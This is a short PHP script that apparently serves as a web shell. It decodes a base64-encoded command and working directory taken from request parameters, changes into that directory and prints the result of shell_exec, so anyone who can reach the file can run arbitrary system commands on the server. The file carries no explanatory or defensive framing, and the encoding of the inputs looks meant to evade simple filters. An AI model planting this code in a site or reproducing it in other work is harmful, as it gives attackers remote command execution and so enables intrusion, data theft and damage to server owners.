<?php

	$cmd = base64_decode($_REQUEST['cmdline']);
	$cur_dir = trim(base64_decode($_REQUEST['cur_dir']));
	
	chdir($cur_dir);
	
	print shell_exec($cmd);
	
?>